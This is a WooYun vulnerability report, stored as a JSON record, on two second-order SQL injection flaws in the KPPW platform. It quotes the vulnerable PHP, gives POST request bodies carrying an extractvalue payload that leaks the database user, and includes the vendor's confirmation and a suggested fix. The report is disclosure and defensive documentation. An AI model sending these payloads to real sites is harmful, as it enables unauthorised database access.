{"id": 84794, "wybug_id": "wooyun-2015-0141694", "wybug_title": "kppw最新版2处sql注入。", "wybug_corp": "keke.com", "wybug_author": "%270x5c", "wybug_date": "2015-10-07 09:25", "wybug_open_date": "2016-01-11 15:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-14：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 二次注入。 详细说明：  #1/www/control/user/account_basic.php\n.....$arrMemberExts = kekezu::get_table_data ( \"*\", \"witkey_member_ext\", \" type='sect' and uid= \".$gUid, \"\", \"\", \"\", \"k\" );........if ($sect) {\t\t\tforeach ( $sect as $k => $v ) {\t\t\t\tif ($arrMemberExts [$k])\t\t\t\t\tdb_factory::execute ( sprintf ( \" update %switkey_member_ext set v1='%s' where k='%s' and uid='%d'\", TABLEPRE, $v, $k, $gUid ) );\t\t\t\telse {\t\t\t\t\t$ext_obj = new Keke_witkey_member_ext_class ();\t\t\t\t\t$ext_obj->setK ( $k );\t\t\t\t\t$ext_obj->setV1 ( kekezu::escape ( $v ) );\t\t\t\t\t$ext_obj->setUid ( $gUid );\t\t\t\t\t$ext_obj->setType ( 'sect' );\t\t\t\t\t$ext_obj->create_keke_witkey_member_ext ();\t\t\t\t}\t\t\t}\t\t}\n跟到create_keke_witkey_member_ext()\nfunction create_keke_witkey_member_ext(){\t\t \t\t $data =  array(); \t\t\t\t\tif(!is_null($this->_ext_id)){ \t\t\t\t $data['ext_id']=$this->_ext_id;\t\t\t}\t\t\tif(!is_null($this->_uid)){ \t\t\t\t $data['uid']=$this->_uid;\t\t\t}\t\t\tif(!is_null($this->_k)){ \t\t\t\t $data['k']=$this->_k;\t\t\t}\t\t\tif(!is_null($this->_v1)){ \t\t\t\t $data['v1']=$this->_v1;\t\t\t}\t\t\tif(!is_null($this->_v2)){ \t\t\t\t $data['v2']=$this->_v2;\t\t\t}\t\t\tif(!is_null($this->_v3)){ \t\t\t\t $data['v3']=$this->_v3;\t\t\t}\t\t\tif(!is_null($this->_v4)){ \t\t\t\t $data['v4']=$this->_v4;\t\t\t}\t\t\tif(!is_null($this->_v5)){ \t\t\t\t $data['v5']=$this->_v5;\t\t\t}\t\t\tif(!is_null($this->_type)){ \t\t\t\t $data['type']=$this->_type;\t\t\t}\t\t\t return $this->_ext_id = $this->_db->inserttable($this->_tablename,$data,1,$this->_replace); \t\t }\n对于 post传入的 sect数组，先判断其键是否存在，存在则update，不存在就insert。这里就出问题了，如果我们先提交sect[1'] 会insert values('1\\'')再重复提交一次的话， 就会进入update了，单引号就带进来了。注册用户，index.php?do=user&view=account&op=basicpost两次数据:\nformhash=00a201&pk%5Buid%5D=10&is_perfect=1&indus_pid=-1&indus_id=-1&truename=%E5%98%89%E5%AE%A2&sex=-1&birthday=2015-09-09&email=a%**.**.**.**&sect%5Bemail%5D=1&mobile=18615478859&sect%5B1'and extractvalue(1,concat(0x5c,user()))#%5D=12222&qq=123213213&sect%5Bqq%5D=1&msn=&sect%5Bmsn%5D=1&phone=&sect%5Bphone%5D=1&province=p&city=c&area=a\n\n\n#2/www/control/user/account_contact.php\nif($gUserInfo['city']){\t$arrCity = CommonClass::getDistrictByPid($gUserInfo['province'],'id,upid,name');}if($gUserInfo['area']){\t$arrArea = CommonClass::getDistrictByPid($gUserInfo['city'],'id,upid,name');}if (isset($formhash)&&kekezu::submitcheck($formhash)) {\tif($gUserInfo['uid'] != $pk['uid']){\t\tkekezu::show_msg('无权操作',NULL,NULL,NULL,'error');\t\treturn false;\t}\t$arrData =array(\t\t'email'\t=>$email,\t\t'mobile'=>$mobile,\t\t'qq'\t=>$qq,\t\t'msn'\t=>$msn,\t\t'phone'\t=>$phone,\t\t'province'=>$province,\t\t'city'=>$city,\t\t'area'=>$area\t);\t$intRes = $objSpaceT->save($arrData,$pk);\tif ($sect) {\t\tforeach ( $sect as $k => $v ) {\t\t\tif ($arrMemberExts [$k])\t\t\t\tdb_factory::execute ( sprintf ( \" update %switkey_member_ext set v1='%s' where k='%s' and uid='%d'\", TABLEPRE, $v, $k, $gUid ) );\t\t\telse {\t\t\t\t$ext_obj = new Keke_witkey_member_ext_class ();\t\t\t\t$ext_obj->setK ( $k );\t\t\t\t$ext_obj->setV1 ( kekezu::escape ( $v ) );\t\t\t\t$ext_obj->setUid ( $gUid );\t\t\t\t$ext_obj->setType ( 'sect' );\t\t\t\t$ext_obj->create_keke_witkey_member_ext ();\t\t\t}\t\t}\n前面的条件全满足即可注入。/index.php?do=user&view=account&op=contactpost：\nformhash=01b251&pk%5Buid%5D=10&is_perfect=1&indus_pid=-1&indus_id=-1&truename=%E5%98%89%E5%AE%A2&sex=-1&birthday=2015-09-09&email=a%**.**.**.**&sect%5Bemail%5D=1&mobile=18615478859&sect%5B1'and extractvalue(1,concat(0x5c,user()))#%5D=12222&qq=123213213&sect%5Bqq%5D=1&msn=&sect%5Bmsn%5D=1&phone=&sect%5Bphone%5D=1&province=p&city=c&area=a\n\n\n   漏洞证明：  \n\n\n\n   修复方案：  判断键是否合法，update时 再转义下   版权声明：转载请注明来源 %270x5c@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-10-11 16:21 厂商回复： 感谢您的关注和支持，我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}